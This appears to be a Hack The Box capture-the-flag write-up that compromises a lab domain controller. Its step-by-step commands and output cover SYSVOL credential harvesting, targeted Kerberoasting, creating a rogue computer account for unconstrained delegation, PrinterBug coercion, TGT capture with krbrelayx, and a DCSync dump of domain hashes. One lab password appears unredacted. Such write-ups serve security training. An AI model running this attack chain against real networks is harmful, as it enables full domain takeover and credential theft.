---
title: "Hack The Box: Delegate"
date: 2025-11-22
summary: "A Medium Windows-based machine where the target is compromised by extracting cleartext domain credentials from a batch script in SYSVOL, then abusing GenericWrite permissions to perform targeted Kerberoasting for WinRM access. Domain administrative compromise is achieved by leveraging SeEnableDelegationPrivilege to set up an unconstrained delegation computer account, coercing the Domain Controller to authenticate via PrinterBug, and harvesting its TGT for a DCSync attack."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Delegate"
tags:
  - ace-genericwrite
  - active-directory
  - addspn
  - bloodhound
  - bloodhound-ce-python
  - bloodyad
  - coerce-plus
  - credentials-in-public-shares
  - dcsync
  - dnstool
  - evil-winrm
  - impacket-addcomputer
  - impacket-secretsdump
  - john
  - kerberoasting
  - krbrelayx
  - netexec
  - nmap
  - printerbug
  - pypykatz
  - seenabledelegationprivilege
  - smbclient
  - targetedkerberoasting-py
  - unconstrained-delegation
---

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.23.75
Nmap scan report for 10.129.23.75
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-11-22 10:22:16 +04 for 72s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-22 06:22:58Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Issuer: commonName=DC1.delegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-21T06:20:16
| Not valid after:  2026-05-23T06:20:16
| MD5:   c1a5:1be6:1eac:c35d:3017:60d9:ff9f:2881
| SHA-1: bcf8:a191:d5a3:a76f:b867:4558:5e48:2c35:9705:1ed1
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-22T06:23:49+00:00; +26s from scanner time.
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-22T06:23:09+00:00
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-22T06:23:10
|_  start_date: N/A
|_clock-skew: mean: 25s, deviation: 0s, median: 25s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38386/tcp): CLEAN (Timeout)
|   Check 2 (port 12896/tcp): CLEAN (Timeout)
|   Check 3 (port 16752/udp): CLEAN (Timeout)
|   Check 4 (port 21471/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
<SNIP>
```

The running services indicate that the target is a Domain Controller (DC).

### Enumerating SMB

Let’s start with SMB share enumeration using null or guest credentials:

```bash
$ netexec smb 10.129.23.75 -u '' -p '' --shares
SMB         10.129.23.75    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.23.75    445    DC1              [+] delegate.vl\:
SMB         10.129.23.75    445    DC1              [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Authentication with null account is allowed but share enumeration isn’t.

Let’s switch to guest account:

```bash
$ netexec smb 10.129.23.75 -u guest -p '' --shares
SMB         10.129.23.75    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.23.75    445    DC1              [+] delegate.vl\guest:
SMB         10.129.23.75    445    DC1              [*] Enumerated shares
SMB         10.129.23.75    445    DC1              Share           Permissions     Remark
SMB         10.129.23.75    445    DC1              -----           -----------     ------
SMB         10.129.23.75    445    DC1              ADMIN$                          Remote Admin
SMB         10.129.23.75    445    DC1              C$                              Default share
SMB         10.129.23.75    445    DC1              IPC$            READ            Remote IPC
SMB         10.129.23.75    445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.23.75    445    DC1              SYSVOL          READ            Logon server share
```

The guest account can enumerate the available shares, but none of them appear to contain anything important.

### Exploiting A.Briggs

Although SYSVOL usually includes not-that-important data, it is worth giving it a shot, especially that no credentials were provided.

I’ll download all of its files recursively with `smbclient`:

```bash
$ smbclient -N //delegate.vl/SYSVOL
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
<SNIP>
```

```bash
$ tree .
.
└── delegate.vl
    ├── DfsrPrivate
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Registry.pol
    │   │   │   └── Scripts
    │   │   │       ├── Shutdown
    │   │   │       └── Startup
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts
        └── users.bat
```

The only interesting file is `users.bat`. Let’s check its contents:

```bash
$ cat delegate.vl/scripts/users.bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4s<REDACTED>
```

Interesting: Two usernames and a password.

Let’s check if any of the combinations is valid:

```bash
$ netexec smb delegate.vl -u Administrator -p 'P4s<REDACTED>'
SMB         10.129.23.75    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.23.75    445    DC1              [-] delegate.vl\Administrator:P4s<REDACTED> STATUS_LOGON_FAILURE

$ netexec smb delegate.vl -u A.Briggs -p 'P4s<REDACTED>'
SMB         10.129.23.75    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.23.75    445    DC1              [+] delegate.vl\A.Briggs:P4s<REDACTED>
```

Nice, we’ve got a hit on A.Briggs.

### Bloodhound

Let’s map the domain using `bloodhound`.

First, let’s collect data for it using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d delegate.vl -u A.Briggs -p 'P4s<REDACTED>' -ns 10.129.23.75 -c all --zip
<SNIP>
```

Then let’s import it into `bloodhound`, mark A.Biggs as owned, and see what can this user do:

![Figure 1](/assets/images/writeups/hack-the-box-delegate/hack-the-box-delegate-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Interesting, A.Briggs has GenericWrite permission over N.Thompson. Targeted kerberoasting seems promising here.

Let’s check what can N.Thompson do:

![Figure 2](/assets/images/writeups/hack-the-box-delegate/hack-the-box-delegate-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

This user has the ability to WinRM, resulting in initial foothold.

### Exploiting N.Thompson

Let’s use [targeted kerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to get the hash of N.Thompson:

```bash
$ python3 targetedKerberoast.py -v -d delegate.vl -u A.Briggs -p 'P4s<REDACTED>'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$d45b0c<REDACTED>
[VERBOSE] SPN removed successfully for (N.Thompson)
```

Nice. Now let’s attempt cracking it with `john`:

```bash
$ echo '$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$d45b0c<REDACTED>' > nthompson.hash

$ john nthompson.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
KAL<REDACTED>       (?)
<SNIP>
```

Perfect.

### RCE as N.Thompson

Now let’s use `evil-winrm` to gain RCE where `user.txt` flag will be awaiting:

```bash
$ evil-winrm -i delegate.vl -u N.Thompson -p KAL<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> ls

    Directory: C:\Users\N.Thompson\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/21/2025  10:21 PM             34 user.txt

*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cat user.txt
1e3fce<REDACTED>
```

### SeEnableDelegationPrivilege

Post-compromise enumeration reveals that N.Thompson holds `SeEnableDelegationPrivilege`, which allows the user to modify delegation settings on computer accounts:

```bash
*Evil-WinRM* PS C:\Users\N.thompson\documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

Before showcasing the attack path, let’s verify that the Machine Account Quota value in the domain is not 0:

```bash
$ netexec ldap dc1.delegate.vl -u A.Briggs -p P4s<REDACTED> -M maq
LDAP        10.129.23.75    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.129.23.75    389    DC1              [+] delegate.vl\A.Briggs:P4s<REDACTED>
MAQ         10.129.23.75    389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.129.23.75    389    DC1              MachineAccountQuota: 10
```

Nice, it is 10, which is the default value in Active Directory domains.

### Attack Path

The domain is configured with a default Machine Account Quota, meaning any authenticated user can create up to 10 computer accounts. Since N.Thompson can also enable delegation on those computers, this user can:

1. Create and set up a fake computer account he fully control.
2. Mark that computer as trusted for unconstrained delegation.
3. Force the DC to authenticate to it.
4. Capture the DC’s TGT.
5. Use that TGT to perform DCSync and dump all domain hashes.

The main idea is that unconstrained delegation causes any system authenticating to the fake machine to leak a copy of its TGT. Forcing the DC to authenticate will leak its TGT, which is enough to fully compromise the domain.

1. First, let’s create a new computer account that we control using `impacket-addcomputer`:

```bash
$ impacket-addcomputer -computer-name fake -computer-pass fake1234 -dc-ip 10.129.23.75 delegate.vl/N.Thompson:'KAL<REDACTED>'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account fake$ with password fake1234.
```

1. Now let’s use `dnstool` to add a DNS record on the fake machine and make it point to the attacker machine:

```bash
$ dnstool -u 'delegate.vl\fake$' -p 'fake1234' --action add --record fake.delegate.vl --data 10.10.14.125 --type A -dns-ip 10.129.23.75 dc1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

1. Next, let’s use `addspn` to add an SPN to the machine account as it is required for Kerberos authentication targeted at this machine:

```bash
$ addspn -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/fake.delegate.vl' -t 'fake$' -dc-ip 10.129.56.255 dc1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

1. Let’s now use `bloodyAD` to make fake$ trusted for delegation:

```bash
$ bloodyAD -d delegate.vl -u N.Thompson -p KAL<REDACTED> --host dc1.delegate.vl add uac 'fake$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to fake$'s userAccountControl
```

1. Upcoming steps require the NTLM hash of the fake machine account, so let’s extract it using `pypykatz`:

```bash
$ pypykatz crypto nt fake1234
ae07a00e20f0080f46ba48e391fb0219
```

1. Next, let’s use `krbrelayx` to capture the DC’s TGT:

```bash
$ krbrelayx -hashes :ae07a00e20f0080f46ba48e391fb0219
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

1. Finally, let’s use PrinterBug module in `netexec` to force the DC to authenticate to fake$:

```bash
$ netexec smb dc1.delegate.vl -u 'fake$' -p fake1234 -M coerce_plus -o LISTENER=fake.delegate.vl METHOD=PrinterBug
SMB         10.129.23.75    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.23.75    445    DC1              [+] delegate.vl\fake$:fake1234
COERCE_PLUS 10.129.23.75    445    DC1              VULNERABLE, PrinterBug
COERCE_PLUS 10.129.23.75    445    DC1              Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

```bash
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.23.75
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.23.75
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
[*] SMBD: Received connection from 10.129.23.75
[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
```

1. Let’s now export the ticket:

```bash
$ export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

Then let’s use `impacket-secretsdump` to perform DCSync and dump all domain secrets:

```bash
$ impacket-secretsdump -k -no-pass dc1.delegate.vl

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198<REDACTED>:::
<REDACTED>
[*] Cleaning up...
```

### RCE as Administrator

Now let’s use that hash with `evil-winrm` to gain RCE as administrator and grab the `root.txt` flag:

```bash
$ evil-winrm -i delegate.vl -u Administrator -H c32198<REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/21/2025  10:21 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
1f0aac<REDACTED>
```
